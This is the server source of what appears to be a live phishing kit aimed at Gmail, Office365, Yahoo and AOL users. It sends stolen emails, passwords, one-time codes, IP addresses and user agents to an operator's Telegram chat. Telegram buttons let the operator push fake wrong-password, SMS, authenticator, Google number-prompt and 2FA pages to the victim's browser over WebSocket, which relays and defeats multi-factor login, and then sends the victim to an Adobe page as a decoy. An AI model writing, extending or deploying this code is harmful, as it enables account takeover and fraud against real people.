const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const url = require('url');
const TelegramBot = require('node-telegram-bot-api');

// --- Basic Setup ---
const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 10000;

app.set('trust proxy', true);

// --- Telegram Bot Configuration ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("[SERVER] FATAL ERROR: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are required.");
  process.exit(1);
}

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
console.log('[SERVER] Telegram Bot listener has started.');

// --- Middleware & WebSocket Server ---
app.use(express.json());
const wss = new WebSocketServer({ server, path: '/ws' });
const activeConnections = new Map();

// --- API Endpoint ---
app.post('/api/send-telegram', async (req, res) => {
  console.log('[SERVER] Received data from frontend.');
  const payload = { ...req.body, ipAddress: req.ip };
  const message = formatMessage(payload); // Uses the new, redesigned formatting
  const sessionId = payload?.data?.sessionId;
  const providerKey = (payload?.data?.provider || 'O').charAt(0).toUpperCase();

  if (!sessionId) {
    return res.status(400).json({ status: 'error', message: 'SessionID is missing.' });
  }

  // Updated inline keyboard with the new Google Number Prompt function
  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Incorrect Pass", callback_data: `ip:${sessionId}:${providerKey}` }, { text: "SMS Page", callback_data: `sms:${sessionId}:${providerKey}` }],
        [{ text: "Authenticator", callback_data: `auth:${sessionId}:${providerKey}` }, { text: "Google # Prompt", callback_data: `g_prompt:${sessionId}` }],
        [{ text: "Account Locked", callback_data: `lock:${sessionId}:${providerKey}` }, { text: "2FA Page", callback_data: `2fa:${sessionId}:${providerKey}` }],
        [{ text: "Success", callback_data: `success:${sessionId}` }, { text: "Reset", callback_data: `reset:${sessionId}` }],
      ]
    }
  };

  try {
    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown', disable_web_page_preview: true });
    await bot.sendMessage(TELEGRAM_CHAT_ID, "👆 *Choose an action above* 👆", { parse_mode: 'Markdown', reply_markup: options.reply_markup });
  } catch (error) {
    console.error(`[SERVER] Failed to send message to Telegram: ${error.message}`);
  }

  res.status(200).json({ status: 'logged' });
});

// --- WebSocket Connection Handling ---
wss.on('connection', (ws, req) => {
    const queryParams = new URL(req.url, `http://${req.headers.host}`).searchParams;
    const sessionId = queryParams.get('sessionId');

    if (!sessionId) {
        console.log('[SERVER] WebSocket connection rejected: No sessionId provided.');
        return ws.terminate();
    }
    activeConnections.set(sessionId, ws);
    console.log(`[SERVER] Client connected: ${sessionId}`);
    ws.on('close', () => {
        console.log(`[SERVER] Client disconnected: ${sessionId}`);
        activeConnections.delete(sessionId);
    });
    ws.on('error', (e) => console.error(`[SERVER] WS Error for ${sessionId}:`, e));
});

// --- Telegram Bot Callback Handler (Updated) ---
bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data;
    const [cmd, sessionId, providerKey] = data.split(':');

    if (!cmd || !sessionId) return bot.answerCallbackQuery(callbackQuery.id);

    bot.answerCallbackQuery(callbackQuery.id, { text: `Sending ${cmd}...` });

    const providerMap = { 'G': 'gmail', 'O': 'office365', 'Y': 'yahoo', 'A': 'aol', 'S': 'others' };
    const provider = providerMap[providerKey] || 'others';

    const commandMap = {
        'ip': 'show_incorrect_password', 'sms': 'show_sms_code',
        'auth': 'show_authenticator_approval', 'lock': 'show_account_locked',
        'sec': 'show_security_check', '2fa': 'show_two_factor',
        'email_v': 'show_email_verification',
        'g_prompt': 'show_google_number_prompt', // New command for Google Number Prompt
        'success': 'redirect', 'reset': 'reset',
    };
    const wsCommand = commandMap[cmd];

    if (!wsCommand) return;

    let commandData = { provider };
    if (wsCommand === 'redirect') {
        commandData.url = 'https://www.adobe.com/acrobat/online/sign-pdf.html';
    }
    // For the new Google prompt, we simulate a numbers payload.
    // You can customize these numbers as needed.
    if (wsCommand === 'show_google_number_prompt') {
        commandData.numbers = [Math.floor(Math.random() * 90) + 10, Math.floor(Math.random() * 90) + 10, Math.floor(Math.random() * 90) + 10];
    }

    const ws = activeConnections.get(sessionId);
    if (ws && ws.readyState === ws.OPEN) {
        ws.send(JSON.stringify({ command: wsCommand, data: commandData }));
        console.log(`[SERVER] Sent command '${wsCommand}' to client ${sessionId}`);
    } else {
        console.log(`[SERVER] Could not send command to client ${sessionId}: No active connection.`);
    }
});

// --- Redesigned Helper Function for Clean Telegram Messages ---
const formatMessage = (payload) => {
    const { type, data, ipAddress } = payload;
    if (!data) return "*Received empty payload*";

    const now = new Date();
    const timestamp = `${now.toLocaleDateString()} ${now.toLocaleTimeString()}`;
    
    // Header
    let header = '';
    if (type === 'credentials') header = '💼 New Login Captured';
    else if (type === 'interaction') header = '👆 Interaction Submitted';
    else header = '❓ Unknown Data';

    // Main Content Block
    const mainInfo = [];
    if (data.provider) mainInfo.push(`*Provider:* \`${data.provider}\``);
    if (data.email) mainInfo.push(`*Email:* \`${data.email}\``);
    if (data.password) mainInfo.push(`*Password:* \`${data.password}\``);
    if (data.action) mainInfo.push(`*Action:* \`${data.action}\``);
    if (data.code) mainInfo.push(`*Code:* \`${data.code}\``);

    // System Info Block
    const systemInfo = [
        `*IP Address:* \`${ipAddress || 'N/A'}\``,
        `*User Agent:* \`${data.userAgent || 'N/A'}\``,
        `*Session ID:* \`${data.sessionId || 'N/A'}\``,
        `*Timestamp:* \`${timestamp}\``,
    ];

    // Construct the message
    const messageParts = [
        `*--- ${header} ---*`,
        mainInfo.join('\n'),
        `\n*--- System Info ---*`,
        systemInfo.join('\n')
    ];
    
    return messageParts.join('\n');
};

bot.on('polling_error', (error) => console.error(`[SERVER] Polling error: ${error.code}`));

// --- Start Server ---
server.listen(PORT, '127.0.0.1', () => console.log(`[SERVER] API and WebSocket server running on http://127.0.0.1:${PORT}`));
